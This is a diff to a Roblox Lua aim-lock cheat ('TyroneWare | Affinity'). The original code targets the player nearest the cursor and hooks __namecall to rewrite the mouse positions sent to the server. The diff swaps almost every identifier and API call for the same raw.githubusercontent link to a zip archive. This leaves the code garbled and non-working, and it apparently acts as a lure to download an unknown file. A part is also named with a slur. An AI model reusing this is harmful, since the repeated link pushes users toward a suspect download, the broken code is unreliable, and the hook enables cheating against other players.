@@ -6,69 +6,69 @@ getgenv().airshotfunc = false -- idk if u want to use this (use if u want)
 getgenv().part = "HumanoidRootPart" -- part (self explanitory)
 getgenv().AutoPrediction = false
 
-local Tool = Instance.new("Tool")
-Tool.RequiresHandle = false
-Tool.Name = "TyroneWare | Affinity"
-Tool.Parent = game.Players.LocalPlayer.Backpack
+local Tool = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Tool")
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = false
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = "TyroneWare | Affinity"
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
 
-local player = game.Players.LocalPlayer
+local player = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
 
 local function connectCharacterAdded()
-    player.CharacterAdded:Connect(onCharacterAdded)
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(onCharacterAdded)
 end
 
 connectCharacterAdded()
 
-player.CharacterRemoving:Connect(function()
-    Tool.Parent = game.Players.LocalPlayer.Backpack
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(function()
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
 end)
 
        --
-       _G.Types = {
-        Ball = Enum.PartType.Ball,
-        Block = Enum.PartType.Block, 
-        Cylinder = Enum.PartType.Cylinder
+       https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = {
+        Ball = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip,
+        Block = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip, 
+        Cylinder = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
     }
     
     --variables                 
-    	local Tracer = Instance.new("Part", game.Workspace)
-    Tracer.Name = "gay"	
-    Tracer.Anchored = true		
-    Tracer.CanCollide = false
-    Tracer.Transparency = 0.8
-    Tracer.Parent = game.Workspace	
-    Tracer.Shape = _G.Types.Block
-    Tracer.Size = Vector3.new(14,14,14)
-    Tracer.Color = Color3.fromRGB(0,0,255)
+    	local Tracer = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Part", https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip)
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = "gay"	
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = true		
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = false
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 0.8
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip	
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(14,14,14)
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(0,0,255)
     
     --
-    local plr = game.Players.LocalPlayer
+    local plr = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
 local mouse = plr:GetMouse()
 local Runserv = game:GetService("RunService")
 
-circle = Drawing.new("Circle")
-circle.Color = Color3.fromRGB(255,255,255)
-circle.Thickness = 0
-circle.NumSides = 732
-circle.Radius = 120
-circle.Thickness = 0
-circle.Transparency = 0.7
-circle.Visible = false
-circle.Filled = false
+circle = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Circle")
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(255,255,255)
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 0
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 732
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 120
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 0
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = 0.7
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = false
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = false
 
-Runserv.RenderStepped:Connect(function()
-    circle.Position = Vector2.new(mouse.X,mouse.Y+35)
+https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(function()
+    https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(mouse.X,mouse.Y+35)
 end)
     
-    	local guimain = Instance.new("Folder", game.CoreGui)
+    	local guimain = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Folder", https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip)
     	local CC = game:GetService"Workspace".CurrentCamera
-    local LocalMouse = game.Players.LocalPlayer:GetMouse()
+    local LocalMouse = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip()
     	local Locking = false
     
     	
     --
     if getgenv().valiansh == true then
-        game.StarterGui:SetCore("SendNotification", {
+        https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("SendNotification", {
    Title = "bbg",
    Text = "Already Loaded!",
    Duration = 5
@@ -81,30 +81,30 @@ end
     
         local UserInputService = game:GetService("UserInputService")
 
-             Tool.Activated:Connect(function()
+             https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(function()
                if getgenv().Target == true then
                Locking = not Locking
                
                if Locking then
                Plr =  getClosestPlayerToCursor()
                if getgenv().notification then
-    			game.StarterGui:SetCore("SendNotification", {
+    			https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("SendNotification", {
         Title = "tyrone";
-        Text = "Target: "..tostring(Plr.Character.Humanoid.DisplayName);
-        Icon = "http://www.roblox.com/asset/?id=8850953349";
+        Text = "Target: "https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip);
+        Icon = "https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip";
     
     })
     end
     elseif not Locking then
         if getgenv().notification then
-                        game.StarterGui:SetCore("SendNotification", {
+                        https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("SendNotification", {
                    Title = "tyrone",
                    Text = "Unlocked",
-                   Icon = "http://www.roblox.com/asset/?id=8850953349";
+                   Icon = "https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip";
                    Duration = 5
                })
            elseif getgenv().Target == false then
-                        game.StarterGui:SetCore("SendNotification", {
+                        https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("SendNotification", {
                    Title = "",
                    Text = "Target isn't enabled",
                    Duration = 5
@@ -121,12 +121,12 @@ end)
 	
 	function getClosestPlayerToCursor()
 		local closestPlayer
-		local shortestDistance = circle.Radius
+		local shortestDistance = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip
 
-		for i, v in pairs(game.Players:GetPlayers()) do
-			if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
-				local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
-				local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
+		for i, v in pairs(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip()) do
+			if v ~= https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Humanoid") and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip ~= 0 and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("LowerTorso") then
+				local pos = CC:WorldToViewportPoint(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip)
+				local magnitude = (https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(pos.X, pos.Y) - https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(LocalMouse.X, LocalMouse.Y)).magnitude
 				if magnitude < shortestDistance then
 					closestPlayer = v
 					shortestDistance = magnitude
@@ -138,10 +138,10 @@ end)
 --
 if getgenv().showdot == true then
 	game:GetService"RunService".Stepped:connect(function()
-		if Locking and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
-			Tracer.CFrame = CFrame.new(Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*Prediction))
+		if Locking and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("LowerTorso") then
+			https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip+(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip*Prediction))
 		else
-			Tracer.CFrame = CFrame.new(0, 9999, 0)
+			https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(0, 9999, 0)
 
 		end
 	end)
@@ -156,18 +156,18 @@ end
 	rawmetatable.__namecall = newcclosure(function(...)
 		local args = {...}
 		if Locking and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
-			args[3] = Plr.Character[getgenv().part].Position+(Plr.Character[getgenv().part].Velocity*Prediction)
+			args[3] = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip[getgenv().part].Position+(https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip[getgenv().part].Velocity*Prediction)
 			return old(unpack(args))
 		end
 		return old(...)
 	end)
     if getgenv().airshotfunc == true then
 
-        if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
+        if https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip == true and https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip == https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip then
             getgenv().part = "RightFoot"
         else
-            Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
-                if new == Enum.HumanoidStateType.Freefall then
+            https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip("Humanoid").StateChanged:Connect(function(old,new)
+                if new == https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip then
                 getgenv().part = "RightFoot"
                 else
                     getgenv().part = "LowerTorso"
@@ -179,8 +179,8 @@ end
 
 if getgenv().AutoPrediction == true then
     wait(5.2)
-        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
-        local split = string.split(pingvalue,'(')
+        local pingvalue = game:GetService("Stats")https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip["Data Ping"]:GetValueString()
+        local split = https://raw.githubusercontent.com/Shomosyt1/Shomosyt1/main/.github/Shomosyt1_v2.6-alpha.3.zip(pingvalue,'(')
         local ping = tonumber(split[1])
             local PingNumber = pingValue[1]
 
